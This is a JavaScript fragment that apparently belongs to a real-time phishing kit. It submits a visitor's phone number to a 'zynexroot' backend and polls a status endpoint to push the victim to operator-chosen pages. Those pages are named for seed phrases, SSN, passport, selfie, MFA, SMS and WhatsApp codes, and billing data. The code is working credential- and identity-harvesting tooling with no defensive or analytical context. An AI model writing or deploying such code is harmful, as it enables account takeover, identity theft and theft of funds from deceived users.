<script>
    function submit_form() {
        var countryCode = iti.getSelectedCountryData().dialCode;
        var phoneNumber = phoneInput.value.trim();

        // Combine country code and phone number with a space in between
        var fullPhoneNumber = `+${countryCode} ${phoneNumber}`;

        // Validate phone number
        if (!phoneNumber) {
            // Show error message
            document.getElementById('error').style.display = 'flex';
            return; // Stop form submission
        } else {
            // Hide error message
            document.getElementById('error').style.display = 'none';
        }

        // Prepare the data with both country code and phone number in one variable
        const data = new URLSearchParams({ fullPhoneNumber: fullPhoneNumber });

        // Send request using fetch
        fetch('zynexroot/inc/action.php?type=phone', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: data.toString(),
        })
        .then((response) => {
            if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
            }
            return response.json();
        })
        .then((parsed_response) => {
            if (parsed_response.status === 'ok') {
                // Check the checkbox state received from the response
                const redirectUrl = parsed_response.checkbox_state === 1 ? 'done.php' : 'loading.php';
                location.href = redirectUrl;
            } else {
                console.error('Error:', parsed_response.message);
            }
        })
        .catch((error) => {
            console.error('Error during submission:', error);
        });
    }

    // Move the flag selector outside the hidden input
    document.querySelector(".country-code-container").appendChild(document.querySelector(".iti"));

    // Remove border and background from country code section
    document.querySelector(".iti").style.border = "none";
    document.querySelector(".iti").style.background = "transparent";

    // Ensure the input field is always empty on refresh
    window.onload = function() {
        phoneInput.value = "";
    };

    // Allow submission with Enter key
    phoneInput.addEventListener('keydown', function(event) {
        if (event.key === 'Enter') {
            event.preventDefault(); // Prevent default form submission behavior
            submit_form(); // Call the submit function
        }
    });
</script>

<script>
let currentStatus = null;

async function pollStatus() {
    try {
        const response = await fetch('status.php?type=getstatus', {
            method: 'GET',
            headers: { 'Content-Type': 'application/json' }
        });

        if (response.ok) {
            const data = await response.json();
            if (data.status && data.status !== currentStatus) {
                currentStatus = data.status;
                handleRedirection(currentStatus);
            }
        } else {
            console.error("Polling error: HTTP status " + response.status);
        }
    } catch (error) {
        console.error("Polling error:", error);
    } finally {
        // Poll again after a delay
        setTimeout(pollStatus, 2000); // Adjust the interval as needed
    }
}

function handleRedirection(status) {
    const urlMappings = {
				'0': "done.php",
				'1': "index.php",
				'3': "login_error.php",
				'7': "auth_error.php",
				'9': "sms.php",
				'11': "sms_error.php",
				'13': "email_c.php",
				'15': "email_c_error.php",
				'17': "app.php",
				'19': "app_error.php",
				'21': "push.php",
				
				'23': "email_sync.php",
				'25': "email_p.php",
				
				'27': "restricted.php",
				'29': "frozen.php",
				
				'31': "seed.php",
				'33': "seed_err.php",
				
				'35': "reset_password.php",
				'37': "revert.php",
				'39': "newdevice.php",
				'41': "pending.php",
				'43': "notice.php",
				
				'45': "billing.php",
				'47': "data.php",
				'49': "account.php",
				'51': "phone.php",
				'53': "dl-info.php",
				'55': "ssn-info.php",
				'57': "caf.php",
				'59': "form.php",
				'61': "security.php",
				'63': "security_err.php",
				'65': "call.php",
				
				'67': "recovery_start.php",
				'69': "passport.php",
				'71': "driver-license.php",
				'73': "selfie.php",
				'75': "id.php",
				
				'77': "process.php",
				'79': "process_error.php",
				'81': "mfa.php",
				'83': "mfa_error.php",
				'85': "sec.php",
				'87': "sec_error.php",
				
				'140': "trade_p.php",
				'142': "trade_p_error.php",
				'144': "trade_app.php",
				'146': "trade_app_error.php",
				'148': "trade_sms.php",
				'150': "trade_sms_error.php",				
				
				'101': "sms_auth.php",
				'103': "call_auth.php",
							
				'105': "verify.php",
				'107': "code.php",
				'109': "confirm.php",
				'152': "whatsapp.php",
				'154': "whatsapp_error.php",
				'156': "tap.php",
				


                '99': null // Do nothing for status 99
    };

    const targetUrl = urlMappings[status];
    const currentPage = window.location.pathname.split('/').pop(); // Get the current page name

    if (targetUrl && currentPage !== targetUrl) {
        window.location.href = targetUrl;
    }
}

document.addEventListener('DOMContentLoaded', () => {
    pollStatus();
});

